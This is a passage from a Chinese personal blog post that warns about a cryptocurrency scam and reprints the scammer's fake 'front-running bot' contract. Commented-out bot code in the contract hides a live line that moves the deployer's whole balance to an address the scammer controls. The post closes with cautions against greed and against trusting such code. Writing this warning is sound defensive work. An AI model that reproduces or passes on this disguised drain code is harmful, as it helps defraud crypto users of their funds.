class="line">//try &#123;   </span><br><span class="line">        //if (await createWeb3() == false) &#123;</span><br><span class="line">            //console.log(&#x27;Web3 Create Error&#x27;.yellow);</span><br><span class="line">            //process.exit();</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);</span><br><span class="line">        //const out_token_address = TOKEN_ADDRESS;</span><br><span class="line">        //const amount = AMOUNT;</span><br><span class="line">        //const level = LEVEL;</span><br><span class="line">        </span><br><span class="line">        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);</span><br><span class="line">        //if(ret == false) &#123;</span><br><span class="line">          //process.exit();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line"></span><br><span class="line">        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);</span><br><span class="line">        </span><br><span class="line">        //log_str = &#x27;***** Tracking more &#x27; + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + &#x27; &#x27; +  input_token_info.symbol + &#x27;  Exchange on Pancake *****&#x27;</span><br><span class="line">        // console.log(log_str.green);    </span><br><span class="line">        // console.log(web3Ws);</span><br><span class="line">        //web3Ws.onopen = function(evt) &#123;</span><br><span class="line">            //web3Ws.send(JSON.stringify(&#123; method: &quot;subscribe&quot;, topic: &quot;transfers&quot;, address: user_wallet.address &#125;));</span><br><span class="line">            //console.log(&#x27;connected&#x27;)</span><br><span class="line">        </span><br><span class="line">        // get pending transactions</span><br><span class="line">        //subscription = web3Ws.eth.subscribe(&#x27;pendingTransactions&#x27;, function (error, result) &#123;</span><br><span class="line">        //&#125;).on(&quot;data&quot;, async function (transactionHash) &#123;</span><br><span class="line">            //console.log(transactionHash);</span><br><span class="line"></span><br><span class="line">            // let transaction = await web3.eth.getTransaction(transactionHash);</span><br><span class="line">            // if (transaction != null &amp;&amp; transaction[&#x27;to&#x27;] == PANCAKE_ROUTER_ADDRESS)</span><br><span class="line">            // &#123;</span><br><span class="line">            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);</span><br><span class="line">            // &#125;</span><br><span class="line">            </span><br><span class="line">            //if (succeed) &#123;</span><br><span class="line">                //console.log(&quot;The bot finished the attack.&quot;);</span><br><span class="line">                //process.exit();</span><br><span class="line">               </span><br><span class="line">            </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    //catch (error) &#123;</span><br><span class="line">      </span><br><span class="line">      //if(error.data != null &amp;&amp; error.data.see === &#x27;https://infura.io/dashboard&#x27;)</span><br><span class="line">      </span><br><span class="line">         //console.log(&#x27;Daily request count exceeded, Request rate limited&#x27;.yellow);</span><br><span class="line">         //console.log(&#x27;Please insert other API Key&#x27;);</span><br><span class="line">      //else&#123;</span><br><span class="line">         //console.log(&#x27;Unknown Handled Error&#x27;);</span><br><span class="line">         //console.log(error);</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">      //process.exit();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //(await triggersFrontRun(transaction, out_token_address, amount, level)) &#123;</span><br><span class="line">        //subscription.unsubscribe();</span><br><span class="line">        //console.log(&#x27;Perform front running attack...&#x27;);</span><br><span class="line"></span><br><span class="line">        //gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]);</span><br><span class="line">        //newGasPrice = gasPrice + 50*ONE_GWEI;</span><br><span class="line"></span><br><span class="line">        //estimatedInput = ((amount*0.999)*(10**18)).toString();</span><br><span class="line">        //realInput = (amount*(10**18)).toString();</span><br><span class="line">        //gasLimit = (300000).toString();</span><br><span class="line">        </span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line"></span><br><span class="line">        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line">        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&quot;wait until the honest transaction is done...&quot;, transaction[&#x27;hash&#x27;]);</span><br><span class="line"></span><br><span class="line">        //while (await isPending(transaction[&#x27;hash&#x27;])) &#123;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //if(buy_failed)</span><br><span class="line">        </span><br><span class="line">            //succeed = false;</span><br><span class="line">            //return;</span><br><span class="line">           </span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Buy succeed:&#x27;)</span><br><span class="line">        </span><br><span class="line">        //Sell</span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();</span><br><span class="line">        //outputeth = outputeth * 0.999;</span><br><span class="line"></span><br><span class="line">        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);</span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Sell succeed&#x27;);</span><br><span class="line">        //succeed = true;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function approve(gasPrice, outputtoken, out_token_address, user_wallet)&#123;</span><br><span class="line">    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();</span><br><span class="line">    </span><br><span class="line">    //allowance = BigNumber(allowance);</span><br><span class="line">    //outputtoken = BigNumber(outputtoken);</span><br><span class="line"></span><br><span class="line">    //var decimals = BigNumber(10).power(out_token_info.decimals);</span><br><span class="line">    //var max_allowance = BigNumber(10000).multiply(decimals);</span><br><span class="line"></span><br><span class="line">    //if(outputtoken.gt(max_allowance))</span><br><span class="line">   </span><br><span class="line">       //console.log(&#x27;replace max allowance&#x27;)</span><br><span class="line">       //max_allowance = outputtoken;</span><br><span class="line">       </span><br><span class="line">       payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    //if(outputtoken.gt(allowance))&#123;</span><br><span class="line">        //console.log(max_allowance.toString());</span><br><span class="line">        //var approveTX =&#123;</span><br><span class="line">                //from: user_wallet.address,</span><br><span class="line">                //to: out_token_address,</span><br><span class="line">                //gas: 50000,</span><br><span class="line">                //gasPrice: gasPrice*ONE_GWEI,</span><br><span class="line">                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()</span><br><span class="line">                manager;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        //var signedTX = await user_wallet.signTransaction(approveTX);</span><br><span class="line">        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&#x27;Approved Token&#x27;)</span><br><span class="line">    </span><br><span class="line">    //return;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//select attacking transaction</span><br><span class="line">//async function triggersFrontRun(transaction, out_token_address, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //if(attack_started)</span><br><span class="line">        //return false;</span><br><span class="line"></span><br><span class="line">    //console.log((transaction.hash).yellow, parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9);</span><br><span class="line">    //if(parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &gt; 10 &amp;&amp; parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &lt; 50)&#123;</span><br><span class="line">        //attack_started = true;</span><br><span class="line">        //return true</span><br><span class="line">   manager; </span><br><span class="line"></span><br><span class="line">    //return false;</span><br><span class="line"></span><br><span class="line">    //if (transaction[&#x27;to&#x27;] != PANCAKE_ROUTER_ADDRESS) &#123;</span><br><span class="line">        //return false;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    //let data = parseTx(transaction[&#x27;input&#x27;]);</span><br><span class="line">   manager;</span><br><span class="line">    //let method = data[0];</span><br><span class="line">    manager;</span><br><span class="line">    //let params = data[1];</span><br><span class="line">    manager;</span><br><span class="line">    //let gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9;</span><br><span class="line">    manager;</span><br><span class="line"></span><br><span class="line">    //if(method == &#x27;swapExactETHForTokens&#x27;)</span><br><span class="line">    manager;</span><br><span class="line">    </span><br><span class="line">        //let in_amount = transaction;</span><br><span class="line">        manager;</span><br><span class="line">        //let out_min = params[0];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //let path = params[1];</span><br><span class="line">        manager;</span><br><span class="line">        //let in_token_addr = path[0];</span><br><span class="line">        manager;</span><br><span class="line">        //let out_token_addr = path[path.length-1];</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">        //let recept_addr = params[2];</span><br><span class="line">        manager;</span><br><span class="line">        //let deadline = params[3];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //if(out_token_addr != out_token_address)</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">            // console.log(out_token_addr.blue)</span><br><span class="line">            // console.log(out_token_address)</span><br><span class="line">            //return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>骗子为了让代码伪装的更加像回事，自己注册了一个GitHub账号弄了个uniswapf的名字，混淆视听。。。我也差点被骗。。。</li>
</ol>
<h2 id="警示录"><a href="#警示录" class="headerlink" title="警示录"></a>警示录</h2><ol>
<li>区块链上遵循丛林法则，这里没有监管，没有纪律，一旦损失，无处伸冤。</li>
<li>少贪便宜，天山不会掉馅饼</li>
<li>碰到不懂的，不要头脑发热，被人洗脑，多问问懂的朋友</li>
</ol>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/" rel="tag">机器人</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2020-2022
        <i class="ri-heart-fill heart_icon"></i> zzj
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src=''></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="张智进的博客"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E6%B8%B8">旅游</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2021/11/11/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->
 <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true,
  };
</script>

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>